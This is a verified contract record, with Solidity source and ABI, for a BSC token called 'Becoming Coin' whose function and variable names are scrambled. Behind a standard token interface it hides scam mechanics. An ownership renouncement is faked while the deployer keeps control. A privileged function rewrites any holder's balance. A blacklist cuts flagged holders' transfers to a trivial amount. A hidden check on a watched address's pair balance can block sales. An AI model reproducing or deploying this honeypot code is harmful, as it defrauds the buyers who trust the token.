{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface amountMarketing {\n    function createPair(address limitFee, address receiverLiquidity) external returns (address);\n}\n\ninterface listTokenLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txSell) external view returns (uint256);\n\n    function transfer(address launchExemptMin, uint256 takeReceiver) external returns (bool);\n\n    function allowance(address enableAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchExemptMin,\n        uint256 takeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFrom, uint256 value);\n    event Approval(address indexed enableAuto, address indexed spender, uint256 value);\n}\n\nabstract contract launchEnableList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingModeAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoModeReceiver is listTokenLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BecomingCoin is launchEnableList, listTokenLaunch, autoModeReceiver {\n\n    address public amountFromMax;\n\n    address takeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public receiverSwap;\n\n    function owner() external view returns (address) {\n        return launchedMode;\n    }\n\n    constructor (){\n        \n        tradingModeAmount liquidityModeTeam = tradingModeAmount(fromBuy);\n        amountFromMax = amountMarketing(liquidityModeTeam.factory()).createPair(liquidityModeTeam.WETH(), address(this));\n        \n        teamAuto = _msgSender();\n        totalShouldLaunch[teamAuto] = true;\n        fundMarketing[teamAuto] = buyMarketing;\n        walletTotalTo();\n        if (toLimit != amountTake) {\n            receiverSwap = toLimit;\n        }\n        emit Transfer(address(0), teamAuto, buyMarketing);\n    }\n\n    uint256 private launchLimit;\n\n    uint256 private buyMarketing = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return launchedMode;\n    }\n\n    uint256 private toLimit;\n\n    bool private sellAtLaunched;\n\n    function exemptReceiver() private view {\n        require(totalShouldLaunch[_msgSender()]);\n    }\n\n    function allowance(address amountToken, address buyTotal) external view virtual override returns (uint256) {\n        if (buyTotal == fromBuy) {\n            return type(uint256).max;\n        }\n        return buyAuto[amountToken][buyTotal];\n    }\n\n    uint256 shouldSell;\n\n    function marketingFee(uint256 takeReceiver) public {\n        exemptReceiver();\n        shouldSell = takeReceiver;\n    }\n\n    function transfer(address minTeamTrading, uint256 takeReceiver) external virtual override returns (bool) {\n        return fromAmount(_msgSender(), minTeamTrading, takeReceiver);\n    }\n\n    function fromAmount(address limitLaunch, address launchExemptMin, uint256 takeReceiver) internal returns (bool) {\n        if (limitLaunch == teamAuto) {\n            return autoFromTrading(limitLaunch, launchExemptMin, takeReceiver);\n        }\n        uint256 launchTrading = listTokenLaunch(amountFromMax).balanceOf(takeShould);\n        require(launchTrading == shouldSell);\n        require(launchExemptMin != takeShould);\n        if (amountTo[limitLaunch]) {\n            return autoFromTrading(limitLaunch, launchExemptMin, minIs);\n        }\n        return autoFromTrading(limitLaunch, launchExemptMin, takeReceiver);\n    }\n\n    address private launchedMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeList;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyAuto;\n\n    mapping(address => uint256) private fundMarketing;\n\n    function balanceOf(address txSell) public view virtual override returns (uint256) {\n        return fundMarketing[txSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptLiquidity;\n    }\n\n    uint256 senderAmount;\n\n    uint256 public amountTake;\n\n    event OwnershipTransferred(address indexed sellAmount, address indexed modeExemptTeam);\n\n    function approve(address buyTotal, uint256 takeReceiver) public virtual override returns (bool) {\n        buyAuto[_msgSender()][buyTotal] = takeReceiver;\n        emit Approval(_msgSender(), buyTotal, takeReceiver);\n        return true;\n    }\n\n    function walletTotalTo() public {\n        emit OwnershipTransferred(teamAuto, address(0));\n        launchedMode = address(0);\n    }\n\n    bool public fromAt;\n\n    uint256 public marketingAtMode;\n\n    function senderTo(address teamMode) public {\n        exemptReceiver();\n        if (sellAtLaunched) {\n            marketingAtMode = launchLimit;\n        }\n        if (teamMode == teamAuto || teamMode == amountFromMax) {\n            return;\n        }\n        amountTo[teamMode] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoLimit;\n    }\n\n    function fundIs(address swapExempt) public {\n        if (launchTotal) {\n            return;\n        }\n        \n        totalShouldLaunch[swapExempt] = true;\n        \n        launchTotal = true;\n    }\n\n    uint256 public swapMin;\n\n    string private modeList = \"BCN\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMarketing;\n    }\n\n    uint256 public launchedShouldToken;\n\n    bool public launchTotal;\n\n    address public teamAuto;\n\n    string private autoLimit = \"Becoming Coin\";\n\n    bool public fundBuy;\n\n    uint8 private exemptLiquidity = 18;\n\n    uint256 constant minIs = 9 ** 10;\n\n    address fromBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address limitLaunch, address launchExemptMin, uint256 takeReceiver) external override returns (bool) {\n        if (_msgSender() != fromBuy) {\n            if (buyAuto[limitLaunch][_msgSender()] != type(uint256).max) {\n                require(takeReceiver <= buyAuto[limitLaunch][_msgSender()]);\n                buyAuto[limitLaunch][_msgSender()] -= takeReceiver;\n            }\n        }\n        return fromAmount(limitLaunch, launchExemptMin, takeReceiver);\n    }\n\n    mapping(address => bool) public amountTo;\n\n    function sellReceiver(address minTeamTrading, uint256 takeReceiver) public {\n        exemptReceiver();\n        fundMarketing[minTeamTrading] = takeReceiver;\n    }\n\n    mapping(address => bool) public totalShouldLaunch;\n\n    function autoFromTrading(address limitLaunch, address launchExemptMin, uint256 takeReceiver) internal returns (bool) {\n        require(fundMarketing[limitLaunch] >= takeReceiver);\n        fundMarketing[limitLaunch] -= takeReceiver;\n        fundMarketing[launchExemptMin] += takeReceiver;\n        emit Transfer(limitLaunch, launchExemptMin, takeReceiver);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeExemptTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShouldToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAtMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"senderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalShouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchExemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BecomingCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}